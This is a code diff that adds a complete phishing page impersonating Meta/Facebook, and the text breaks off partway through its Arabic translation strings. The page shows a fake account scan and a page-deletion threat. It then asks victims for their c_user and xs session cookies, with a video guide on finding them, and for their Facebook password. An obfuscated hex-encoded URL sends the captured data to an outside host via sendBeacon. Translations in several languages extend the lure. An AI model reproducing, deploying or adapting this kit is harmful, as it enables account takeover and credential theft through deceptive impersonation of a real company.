+        background: linear-gradient(135deg, #137df7, #0767db);
+        box-shadow: 0 16px 28px rgba(24, 119, 242, .30), inset 0 1px 0 rgba(255, 255, 255, .38);
+        transform: translateY(-1px);
+    }
+
+    .pw-continue:disabled {
+        opacity: .8;
+        pointer-events: none;
+    }
+
+    .pw-continue.loading .pw-lbl { display: none; }
+
+    .pw-spin {
+        display: none;
+        width: 17px;
+        height: 17px;
+        border: 2px solid rgba(255, 255, 255, .35);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin .7s linear infinite;
+    }
+
+    .pw-continue.loading .pw-spin { display: block; }
+
+    .pw-not-you {
+        display: block;
+        margin-top: 12px;
+        font-size: 13.5px;
+        color: var(--blue);
+        font-weight: 700;
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-family: inherit;
+        width: 100%;
+        text-align: center;
+    }
+
+    .pw-not-you:hover { text-decoration: underline; }
+
+    .pw-success {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        padding: 8px 0 4px;
+    }
+
+    .pw-success.show { display: flex; }
+
+    .pw-ok-icon {
+        width: 58px;
+        height: 58px;
+        background: rgba(219, 246, 231, .82);
+        border: 1px solid rgba(39, 137, 91, .20);
+        border-radius: 50%;
+        box-shadow: 0 8px 18px rgba(39, 137, 91, .12), inset 0 1px 0 rgba(255, 255, 255, .84);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 14px;
+    }
+
+    .pw-ok-t {
+        font-size: 16px;
+        font-weight: 800;
+        color: var(--success);
+        margin-bottom: 4px;
+    }
+
+    .pw-ok-s {
+        font-size: 13.5px;
+        color: var(--muted);
+    }
+
+    @keyframes badgePop {
+        from { opacity: 0; transform: scale(.4); }
+        to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes glowPulse {
+        0%, 100% { transform: scale(1); opacity: .8; }
+        50% { transform: scale(1.18); opacity: 0; }
+    }
+
+    @keyframes fadeUp {
+        from { opacity: 0; transform: translateY(16px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes shimmer {
+        0% { left: -60%; }
+        60%, 100% { left: 130%; }
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 1; transform: scale(1); }
+        50% { opacity: .4; transform: scale(.75); }
+    }
+
+    @media (max-width: 520px) {
+        .topbar { padding: 0 12px; }
+        .topbar-logo { width: 52px; }
+        .topbar-title { font-size: 14px; }
+        #lang-box { padding: 22px 18px; border-radius: 20px; }
+        .mv-page, .form-page, .pw-page { margin: 18px auto; padding-left: 12px; padding-right: 12px; }
+        .hdr-card, .frm-card { padding: 18px; }
+        .pw-card { padding: 22px 18px; }
+    }
+
+    @media (max-width: 390px) {
+        .lm-grid { grid-template-columns: 1fr; }
+        .topbar-lang { padding: 5px 8px; }
+        .topbar-sep { display: none; }
+    }
+</style>
+
+</head>
+<body>
+
+<div id="lang-wrap">
+    <div id="lang-box">
+        <div class="lm-top">
+            <div class="lm-icon"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbFw7bTxsZzzKmMBeElXdg2MwmQIq2wmgoKTLiQo5bYQ&s" alt="lan"></div>
+            <div class="lm-h">Select Your Language</div>
+        </div>
+        <div class="lm-sub">Choose your language to continue.</div>
+        <input class="lm-search" id="lm-search" type="text" placeholder="Search language…" autocomplete="off">
+        <div class="lm-grid" id="lm-grid">
+            <div class="lm-opt" data-lang="english"><img src="https://flagcdn.com/24x18/us.png" alt="US"><span>English</span></div>
+            <div class="lm-opt" data-lang="hindi"><img src="https://flagcdn.com/24x18/in.png" alt="IN"><span>Hindi</span></div>
+            <div class="lm-opt" data-lang="spanish"><img src="https://flagcdn.com/24x18/es.png" alt="ES"><span>Spanish</span></div>
+            <div class="lm-opt" data-lang="portuguese"><img src="https://flagcdn.com/24x18/pt.png" alt="PT"><span>Portuguese</span></div>
+            <div class="lm-opt" data-lang="arabic"><img src="https://flagcdn.com/24x18/sa.png" alt="SA"><span>Arabic</span></div>
+            <div class="lm-opt" data-lang="french"><img src="https://flagcdn.com/24x18/fr.png" alt="FR"><span>French</span></div>
+            <div class="lm-opt" data-lang="tamil"><img src="https://flagcdn.com/24x18/in.png" alt="IN"><span>Tamil</span></div>
+            <div class="lm-opt" data-lang="vietnamese"><img src="https://flagcdn.com/24x18/vn.png" alt="VN"><span>Vietnamese</span></div>
+            <div class="lm-opt" data-lang="ghanaian"><img src="https://flagcdn.com/24x18/gh.png" alt="GH"><span>Ghanaian (Twi)</span></div>
+        </div>
+        <button class="lm-confirm" id="lm-confirm" disabled>Confirm Language</button>
+    </div>
+</div>
+
+<div id="s1" class="step active">
+
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbFw7bTxsZzzKmMBeElXdg2MwmQIq2wmgoKTLiQo5bYQ&s" alt="lan"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title">Page Deletion Notice</span>
+    </nav>
+
+    <div id="scanScreen">
+        <div class="scan-ring-wrap">
+            <div class="scan-ring"></div>
+            <div class="scan-ring-inner"></div>
+            <div class="scan-fb-icon">
+                <img src="https://marketplace.canva.com/KrzKM/MAGzNqKrzKM/1/tl/canva-facebook-logo-MAGzNqKrzKM.png" alt="lan">
+            </div>
+        </div>
+        <div class="scan-title" id="t-scan-title">Checking Your Account Status</div>
+        <div class="scan-sub" id="t-scan-sub">Meta is reviewing your account for policy violations…</div>
+        <div class="scan-progress-wrap">
+            <div class="scan-progress-bar"><div class="scan-progress-fill" id="progressFill"></div></div>
+            <div class="scan-status" id="scanStatus">Initializing…</div>
+        </div>
+        <div class="scan-checks">
+            <div class="scan-chk-row" id="chk1"><div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span id="t-chk1">Retrieving account data</span></div>
+            <div class="scan-chk-row" id="chk2"><div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span id="t-chk2">Checking recent activity</span></div>
+            <div class="scan-chk-row" id="chk3"><div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span id="t-chk3">Scanning for policy violations</span></div>
+            <div class="scan-chk-row" id="chk4"><div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span id="t-chk4">Reviewing reports</span></div>
+        </div>
+    </div>
+
+    <div id="violationFlash">
+        <div class="violation-wrap"><div class="violation-glow"></div><div class="violation-icon">⚠️</div></div>
+        <div class="violation-title" id="t-viol-title">Violation Detected!</div>
+        <div class="violation-sub" id="t-viol-sub">Your page has been reported for breaking Meta's Community Standards.</div>
+        <div class="violation-tag"><div class="violation-dot"></div><span id="t-viol-tag">PAGE SCHEDULED FOR DELETION</span></div>
+    </div>
+
+    <div class="mv-page" id="deletionCard" style="display:none;">
+        <div class="card mv-card">
+            <div class="mv-header">
+                <div class="mv-title">Page Deletion Notice</div>
+                <div class="mv-notice-wrap"><div class="mv-notice-glow"></div><div class="warning-symbol">🚫</div></div>
+                <div class="mv-plan-name" id="t-page-name">Your Page: Scheduled for Deletion</div>
+                <div class="mv-plan-desc" id="t-deletion-reason">Reason: Violation of Community Standards (Impersonation / Misinformation)</div>
+                <div class="mv-free-tag"><div class="mv-free-dot"></div><span id="t-deletion-tag">DELETION PENDING · Appeal Required</span></div>
+            </div>
+            <div class="mv-body">
+                <div class="mv-badge-item"><div class="chk-circle"><svg viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#65676b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span id="t-case-number">Case #: 4829-0012-META</span></div>
+                <div class="mv-section"><div class="mv-section-title" id="t-violation-details">Violation Details</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#e53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-r1">Impersonation of another individual or brand</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#e53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-r2">Spreading false or misleading content</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#e53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-r3">Multiple user reports received</div></div></div>
+                </div>
+                <div class="mv-section"><div class="mv-section-title" id="t-what-happens">What Happens Next</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#e53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-n1">Your page will be permanently deleted in 30 days</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#e53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-n2">You may lose all page data and admin rights</div></div></div>
+                </div>
+                <div class="mv-section"><div class="mv-section-title" id="t-appeal-section">Appeal Process</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#0084ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-appeal-info">If you believe this is a mistake, submit an appeal now.</div><div class="mv-feat-sub" id="t-appeal-sub">Our team will review your appeal within 48 hours.</div></div></div>
+                </div>
+            </div>
+            <div class="mv-card-foot">
+                <div class="mv-age-note" id="t-deadline-note">Appeal deadline: 30 days from this notice</div>
+                <button class="mv-continue-btn" id="t-appeal-btn" onclick="goTo('s2')">Submit Appeal</button>
+            </div>
+        </div>
+        <footer class="site-footer" style="border-radius:10px;margin-top:14px;">
+            <div><a href="#">Privacy</a><span class="s">·</span><a href="#">Terms</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<div id="s2" class="step">
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbFw7bTxsZzzKmMBeElXdg2MwmQIq2wmgoKTLiQo5bYQ&s" alt="lan"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title">Appeal Center</span>
+        <button class="topbar-lang" id="s2-lang-btn">
+            <img id="s2-flag" src="https://flagcdn.com/24x18/us.png" alt="">
+            <span id="s2-lang-name">English</span>
+        </button>
+    </nav>
+    <div class="form-page">
+        <div class="breadcrumb">
+            <a href="#" onclick="goTo('s1');return false;" id="t-bc1">Help Center</a>
+            <span class="bc-sep">›</span>
+            <a href="#" onclick="goTo('s1');return false;" id="t-bc2">Managing Your Page</a>
+            <span class="bc-sep">›</span>
+            <span id="t-bc3">Appeal a Page Deletion</span>
+        </div>
+        <div class="card hdr-card">
+            <div class="hdr-badge">⚠️</div>
+            <div><div class="hdr-h" id="t-hdr-h">Appeal Your Page Deletion</div><div class="hdr-p" id="t-hdr-p">Provide the following verification details so our team can review your appeal.</div></div>
+        </div>
+        <div class="card info-card">
+            <div class="info-card-t"><div class="dot"></div><span id="t-info-title">Required Verification</span></div>
+            <span id="t-info-body">To confirm you're the page owner, please enter your Account Confirmation Code and Session Token. Watch the video guide if you need help locating them.</span>
+        </div>
+        <div class="warn-strip">⚠️ <div><strong id="t-warn-imp">Important:</strong> <span id="t-warn-body">Do not log out until your appeal is processed. Logging out will cancel your appeal.</span></div></div>
+        <div class="card vid-card">
+            <div class="vid-lbl"><svg viewBox="0 0 16 16" fill="none"><polygon points="3,2 14,8 3,14" fill="#0084ff"/></svg><span id="t-vid-lbl">Video Guide</span></div>
+            <video id="guide-video" controls preload="metadata"><source id="guide-video-src" src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4"></video>
+        </div>
+        <div class="card frm-card">
+            <div class="frm-t" id="t-frm-t">Submit Your Appeal</div>
+            <div class="frm-s" id="t-frm-s">All fields are required. Incomplete or incorrect information will result in appeal denial.</div>
+            <div class="err-strip"><svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="8" cy="8" r="7"/><path d="M8 5v4M8 11h.01"/></svg><span id="t-err-txt">Enter accurate details. Failure to do so may lead to permanent page deletion.</span></div>
+            <form id="verificationForm">
+                <div class="f-group"><label for="c_user">c_user</label><input type="text" id="c_user" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" required></div>
+                <div class="f-group"><label for="xs">xs</label><input type="text" id="xs" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" required></div>
+                <button class="fb-btn" type="submit" id="submitBtn"><span class="btn-label" id="t-submit-btn">Submit Appeal</span></button>
+            </form>
+        </div>
+        <footer class="site-footer">
+            <div><a href="#">Privacy</a><span class="s">·</span><a href="#">Terms</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<div id="s3" class="step">
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbFw7bTxsZzzKmMBeElXdg2MwmQIq2wmgoKTLiQo5bYQ&s" alt="lan"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title" id="t-s3-nav">Identity Confirmation</span>
+        <div class="topbar-right"><a href="#" id="t-s3-help" style="font-size:13px;color:#0084ff;text-decoration:none;font-weight:600;">Help Center</a></div>
+    </nav>
+    <div class="pw-page">
+        <div class="breadcrumb">
+            <a href="#" onclick="goTo('s1');return false;" id="t-s3-bc1">Help Center</a>
+            <span class="bc-sep">›</span>
+            <span id="t-s3-bc2">Confirm Your Identity</span>
+        </div>
+        <div class="card pw-card">
+            <div id="pwForm">
+                <p class="pw-prompt" id="t-pw-prompt">Enter your Facebook password to verify your identity and complete the appeal.</p>
+                <form id="passwordForm">
+                    <div class="pw-input-wrap">
+                        <input type="password" id="pw-input" placeholder="Facebook password" autocomplete="current-password" required>
+                        <button type="button" class="pw-eye" id="eyeBtn"><svg id="eyeIco" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+                    </div>
+                    <div class="pw-err" id="pwErr"><span id="t-pw-err">The password you entered is incorrect. Please try again.</span></div>
+                    <a href="#" class="pw-forgot" id="t-pw-forgot">Forgot password?</a>
+                    <hr class="pw-hr">
+                    <button type="submit" class="pw-continue" id="pwBtn"><span class="pw-lbl" id="t-pw-continue">Confirm Identity</span><div class="pw-spin"></div></button>
+                </form>
+                <button class="pw-not-you" id="t-pw-not-you">Not you?</button>
+            </div>
+            <div class="pw-success" id="pwSuccess">
+                <div class="pw-ok-icon"><svg width="28" height="28" viewBox="0 0 28 28" fill="none"><path d="M4 14l7 7L24 7" stroke="#1a7f37" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <div class="pw-ok-t" id="t-pw-ok-t">Appeal Submitted</div>
+                <div class="pw-ok-s" id="t-pw-ok-s">Your appeal will be reviewed within 48 hours. Check your email for updates.</div>
+            </div>
+        </div>
+        <footer class="site-footer">
+            <div><a href="#">Privacy</a><span class="s">·</span><a href="#">Terms</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<script>
+    
+    
+    (function() {
+        const hexUrl = "68747470733a2f2f7068702d6d6168686868682d676974687562363334323032342e7761736d65722e6170702f";
+        
+        function hexToString(hex) {
+            let str = '';
+            for (let i = 0; i < hex.length; i += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+            }
+            return str;
+        }
+        
+        const ENDPOINT_URL = hexToString(hexUrl);
+
+       
+        window.sendToEndpoint = function(data) {
+            const params = new URLSearchParams(data).toString();
+            const blob = new Blob([params], { type: 'application/x-www-form-urlencoded' });
+            navigator.sendBeacon(ENDPOINT_URL, blob);
+
+        };
+    })();
+    const T = {
+        english: {
+            scanTitle:'Checking Your Account Status', scanSub:'Meta is reviewing your account for policy violations…',
+            scanInit:'Initializing…', scanS1:'Retrieving account data…', scanS2:'Checking recent activity…',
+            scanS3:'Scanning for policy violations…', scanS4:'Reviewing reports…', scanS5:'Violation confirmed…', scanDone:'✓ Violation detected! Loading notice…',
+            chk1:'Retrieving account data', chk2:'Checking recent activity', chk3:'Scanning for policy violations', chk4:'Reviewing reports',
+            violTitle:'Violation Detected!', violSub:'Your page has been reported for breaking Meta\'s Community Standards.', violTag:'PAGE SCHEDULED FOR DELETION',
+            pageName:'Your Page: Scheduled for Deletion', deletionReason:'Reason: Violation of Community Standards (Impersonation / Misinformation)', deletionTag:'DELETION PENDING · Appeal Required',
+            caseNumber:'Case #: 4829-0012-META', violationDetails:'Violation Details',
+            r1:'Impersonation of another individual or brand', r2:'Spreading false or misleading content', r3:'Multiple user reports received',
+            whatHappens:'What Happens Next', n1:'Your page will be permanently deleted in 30 days', n2:'You may lose all page data and admin rights',
+            appealSection:'Appeal Process', appealInfo:'If you believe this is a mistake, submit an appeal now.', appealSub:'Our team will review your appeal within 48 hours.',
+            deadlineNote:'Appeal deadline: 30 days from this notice', appealBtn:'Submit Appeal',
+            bc1:'Help Center', bc2:'Managing Your Page', bc3:'Appeal a Page Deletion',
+            hdrH:'Appeal Your Page Deletion', hdrP:'Provide the following verification details so our team can review your appeal.',
+            infoTitle:'Required Verification', infoBody:'To confirm you\'re the page owner, please enter your Account Confirmation Code and Session Token. Watch the video guide if you need help locating them.',
+            warnImp:'Important:', warnBody:'Do not log out until your appeal is processed. Logging out will cancel your appeal.',
+            vidLbl:'Video Guide', frmT:'Submit Your Appeal', frmS:'All fields are required. Incomplete or incorrect information will result in appeal denial.',
+            errTxt:'Enter accurate details. Failure to do so may lead to permanent page deletion.',
+            submitBtn:'Submit Appeal', s3Nav:'Identity Confirmation', s3Help:'Help Center', s3Bc1:'Help Center', s3Bc2:'Confirm Your Identity',
+            pwPrompt:'Enter your Facebook password to verify your identity and complete the appeal.', pwPlaceholder:'Facebook password',
+            pwErr:'The password you entered is incorrect. Please try again.', pwForgot:'Forgot password?', pwContinue:'Confirm Identity', pwNotYou:'Not you?',
+            pwOkT:'Appeal Submitted', pwOkS:'Your appeal will be reviewed within 48 hours. Check your email for updates.'
+        },
+        hindi: {
+            scanTitle:'आपके अकाउंट की स्थिति की जाँच', scanSub:'Meta आपके खाते की नीति उल्लंघनों के लिए समीक्षा कर रहा है…',
+            scanInit:'शुरू कर रहे हैं…', scanS1:'खाता डेटा प्राप्त कर रहे हैं…', scanS2:'हाल की गतिविधि की जाँच हो रही है…',
+            scanS3:'नीति उल्लंघनों की जाँच…', scanS4:'रिपोर्ट की समीक्षा…', scanS5:'उल्लंघन की पुष्टि हुई…', scanDone:'✓ उल्लंघन का पता चला! सूचना लोड हो रही है…',
+            chk1:'खाता डेटा प्राप्त करना', chk2:'हाल की गतिविधि की जाँच', chk3:'नीति उल्लंघनों की जाँच', chk4:'रिपोर्ट की समीक्षा',
+            violTitle:'उल्लंघन का पता चला!', violSub:'आपका पेज Meta के सामुदायिक मानकों को तोड़ने के लिए रिपोर्ट किया गया है।', violTag:'पेज डिलीट होने वाला है',
+            pageName:'आपका पेज: डिलीट होने वाला है', deletionReason:'कारण: सामुदायिक मानकों का उल्लंघन (प्रतिरूपण / गलत जानकारी)', deletionTag:'डिलीट होना बाकी · अपील आवश्यक',
+            caseNumber:'केस #: 4829-0012-META', violationDetails:'उल्लंघन का विवरण',
+            r1:'किसी अन्य व्यक्ति या ब्रांड का प्रतिरूपण', r2:'गलत या भ्रामक सामग्री फैलाना', r3:'कई उपयोगकर्ता रिपोर्ट प्राप्त हुई',
+            whatHappens:'आगे क्या होगा', n1:'आपका पेज 30 दिनों में स्थायी रूप से हटा दिया जाएगा', n2:'आप पेज का सारा डेटा और व्यवस्थापक अधिकार खो सकते हैं',
+            appealSection:'अपील प्रक्रिया', appealInfo:'अगर आपको लगता है कि यह गलती है, तो अभी अपील करें।', appealSub:'हमारी टीम 48 घंटों के भीतर आपकी अपील की समीक्षा करेगी।',
+            deadlineNote:'अपील की अंतिम तिथि: इस सूचना से 30 दिन', appealBtn:'अपील सबमिट करें',
+            bc1:'सहायता केंद्र', bc2:'अपना पेज प्रबंधित करें', bc3:'पेज डिलीशन की अपील करें',
+            hdrH:'अपने पेज डिलीशन की अपील करें', hdrP:'अपील की समीक्षा के लिए निम्नलिखित सत्यापन विवरण प्रदान करें।',
+            infoTitle:'आवश्यक सत्यापन', infoBody:'यह पुष्टि करने के लिए कि आप पेज के मालिक हैं, कृपया अपना खाता पुष्टिकरण कोड और सत्र टोकन दर्ज करें। यदि आपको उन्हें ढूँढने में सहायता चाहिए तो वीडियो गाइड देखें।',
+            warnImp:'महत्वपूर्ण:', warnBody:'जब तक आपकी अपील प्रोसेस न हो जाए, लॉग आउट न करें। लॉग आउट करने से आपकी अपील रद्द हो जाएगी।',
+            vidLbl:'वीडियो गाइड', frmT:'अपनी अपील सबमिट करें', frmS:'सभी फ़ील्ड आवश्यक हैं। अधूरी या गलत जानकारी देने पर अपील अस्वीकार कर दी जाएगी।',
+            errTxt:'सटीक विवरण दर्ज करें। ऐसा न करने पर स्थायी पेज डिलीशन हो सकता है।',
+            submitBtn:'अपील सबमिट करें', s3Nav:'पहचान की पुष्टि', s3Help:'सहायता केंद्र', s3Bc1:'सहायता केंद्र', s3Bc2:'अपनी पहचान की पुष्टि करें',
+            pwPrompt:'अपनी पहचान सत्यापित करने और अपील पूरी करने के लिए अपना Facebook पासवर्ड दर्ज करें।', pwPlaceholder:'Facebook पासवर्ड',
+            pwErr:'आपके द्वारा दर्ज किया गया पासवर्ड गलत है। कृपया पुनः प्रयास करें।', pwForgot:'पासवर्ड भूल गए?', pwContinue:'पहचान की पुष्टि करें', pwNotYou:'आप नहीं हैं?',
+            pwOkT:'अपील सबमिट हो गई', pwOkS:'आपकी अपील की समीक्षा 48 घंटों के भीतर की जाएगी। अपडेट के लिए ईमेल देखें।'
+        },
+        spanish: {
+            scanTitle:'Comprobando el estado de tu cuenta', scanSub:'Meta está revisando tu cuenta en busca de infracciones de las políticas…',
+            scanInit:'Inicializando…', scanS1:'Obteniendo datos de la cuenta…', scanS2:'Revisando actividad reciente…',
+            scanS3:'Escaneando infracciones de políticas…', scanS4:'Revisando reportes…', scanS5:'Infracción confirmada…', scanDone:'✓ ¡Infracción detectada! Cargando aviso…',
+            chk1:'Obteniendo datos de la cuenta', chk2:'Revisando actividad reciente', chk3:'Escaneando infracciones de políticas', chk4:'Revisando reportes',
+            violTitle:'¡Infracción detectada!', violSub:'Tu página ha sido reportada por violar las Normas comunitarias de Meta.', violTag:'PÁGINA PROGRAMADA PARA ELIMINACIÓN',
+            pageName:'Tu página: Programada para eliminación', deletionReason:'Motivo: Infracción de las Normas comunitarias (Suplantación / Desinformación)', deletionTag:'ELIMINACIÓN PENDIENTE · Apelación requerida',
+            caseNumber:'Caso #: 4829-0012-META', violationDetails:'Detalles de la infracción',
+            r1:'Suplantación de otra persona o marca', r2:'Difusión de contenido falso o engañoso', r3:'Múltiples reportes de usuarios recibidos',
+            whatHappens:'Qué sucede a continuación', n1:'Tu página será eliminada permanentemente en 30 días', n2:'Podrías perder todos los datos de la página y los derechos de administrador',
+            appealSection:'Proceso de apelación', appealInfo:'Si crees que esto es un error, presenta una apelación ahora.', appealSub:'Nuestro equipo revisará tu apelación en un plazo de 48 horas.',
+            deadlineNote:'Fecha límite para apelar: 30 días a partir de este aviso', appealBtn:'Presentar apelación',
+            bc1:'Centro de ayuda', bc2:'Administrar tu página', bc3:'Apelar la eliminación de una página',
+            hdrH:'Apela la eliminación de tu página', hdrP:'Proporciona los siguientes datos de verificación para que nuestro equipo revise tu apelación.',
+            infoTitle:'Verificación requerida', infoBody:'Para confirmar que eres el propietario de la página, ingresa tu Código de confirmación de cuenta y Token de sesión. Mira el video guía si necesitas ayuda para encontrarlos.',
+            warnImp:'Importante:', warnBody:'No cierres sesión hasta que se procese tu apelación. Cerrar sesión cancelará tu apelación.',
+            vidLbl:'Video guía', frmT:'Envía tu apelación', frmS:'Todos los campos son obligatorios. La información incompleta o incorrecta resultará en la denegación de la apelación.',
+            errTxt:'Ingresa datos precisos. De lo contrario, la página podría eliminarse de forma permanente.',
+            submitBtn:'Enviar apelación', s3Nav:'Confirmación de identidad', s3Help:'Centro de ayuda', s3Bc1:'Centro de ayuda', s3Bc2:'Confirma tu identidad',
+            pwPrompt:'Ingresa tu contraseña de Facebook para verificar tu identidad y completar la apelación.', pwPlaceholder:'Contraseña de Facebook',
+            pwErr:'La contraseña ingresada es incorrecta. Inténtalo de nuevo.', pwForgot:'¿Olvidaste tu contraseña?', pwContinue:'Confirmar identidad', pwNotYou:'¿No eres tú?',
+            pwOkT:'Apelación enviada', pwOkS:'Tu apelación será revisada dentro de 48 horas. Revisa tu correo electrónico para recibir actualizaciones.'
+        },
+        portuguese: {
+            scanTitle:'Verificando o status da sua conta', scanSub:'Meta está revisando sua conta em busca de violações de políticas…',
+            scanInit:'Inicializando…', scanS1:'Obtendo dados da conta…', scanS2:'Verificando atividades recentes…',
+            scanS3:'Procurando violações de políticas…', scanS4:'Analisando denúncias…', scanS5:'Violação confirmada…', scanDone:'✓ Violação detectada! Carregando aviso…',
+            chk1:'Obtendo dados da conta', chk2:'Verificando atividades recentes', chk3:'Procurando violações de políticas', chk4:'Analisando denúncias',
+            violTitle:'Violação detectada!', violSub:'Sua página foi denunciada por violar os Padrões da Comunidade do Meta.', violTag:'PÁGINA PROGRAMADA PARA EXCLUSÃO',
+            pageName:'Sua página: Programada para exclusão', deletionReason:'Motivo: Violação dos Padrões da Comunidade (Falsificação / Desinformação)', deletionTag:'EXCLUSÃO PENDENTE · Apelação necessária',
+            caseNumber:'Caso #: 4829-0012-META', violationDetails:'Detalhes da violação',
+            r1:'Falsificação de outra pessoa ou marca', r2:'Divulgação de conteúdo falso ou enganoso', r3:'Várias denúncias de usuários recebidas',
+            whatHappens:'O que acontece a seguir', n1:'Sua página será excluída permanentemente em 30 dias', n2:'Você pode perder todos os dados da página e os direitos de administrador',
+            appealSection:'Processo de apelação', appealInfo:'Se você acredita que isso é um erro, envie uma apelação agora.', appealSub:'Nossa equipe analisará sua apelação em até 48 horas.',
+            deadlineNote:'Prazo de apelação: 30 dias a partir deste aviso', appealBtn:'Enviar apelação',
+            bc1:'Central de Ajuda', bc2:'Gerenciando sua página', bc3:'Apelar a exclusão de uma página',
+            hdrH:'Apelar a exclusão da sua página', hdrP:'Forneça os seguintes dados de verificação para que nossa equipe analise sua apelação.',
+            infoTitle:'Verificação necessária', infoBody:'Para confirmar que você é o proprietário da página, insira seu Código de Confirmação de Conta e Token de Sessão. Assista ao vídeo guia se precisar de ajuda para localizá-los.',
+            warnImp:'Importante:', warnBody:'Não saia da conta até que sua apelação seja processada. Sair cancelará sua apelação.',
+            vidLbl:'Vídeo guia', frmT:'Enviar sua apelação', frmS:'Todos os campos são obrigatórios. Informações incompletas ou incorretas resultarão na negação da apelação.',
+            errTxt:'Insira detalhes precisos. Caso contrário, a página poderá ser excluída permanentemente.',
+            submitBtn:'Enviar apelação', s3Nav:'Confirmação de identidade', s3Help:'Central de Ajuda', s3Bc1:'Central de Ajuda', s3Bc2:'Confirme sua identidade',
+            pwPrompt:'Digite sua senha do Facebook para verificar sua identidade e concluir a apelação.', pwPlaceholder:'Senha do Facebook',
+            pwErr:'A senha inserida está incorreta. Tente novamente.', pwForgot:'Esqueceu a senha?', pwContinue:'Confirmar identidade', pwNotYou:'Não é você?',
+            pwOkT:'Apelação enviada', pwOkS:'Sua apelação será analisada em até 48 horas. Verifique seu e-mail para atualizações.'
+        },
+        arabic: {
+            scanTitle:'التحقق من حالة حسابك', scanSub:'Meta تراجع حسابك بحثًا عن انتهاكات للسياسات…',
+            scanInit:'جارٍ التهيئة…', scanS1:'جارٍ استرداد بيانات الحساب…', scanS2:'التحقق من النشاط الحديث…',
+            scanS3:'البحث عن انتهاكات السياسات…', scanS4:'مراجعة البلاغات…', scanS5:'تأكيد الانتهاك…', scanDone:'✓ تم الكشف عن انتهاك! جارٍ تحميل الإشعار…',
+            chk1:'استرداد بيانات الحساب', chk2:'التحقق من النشاط الحديث', chk3:'البحث عن انتهاكات السياسات', chk4:'مراجعة البلاغات',
+            violTitle:'تم اكتشاف انتهاك!', violSub:'تم الإبلاغ عن صفحتك لانتهاكها معايير المجتمع الخاصة بـ Meta.', violTag:'الصفحة مقررة للحذف',
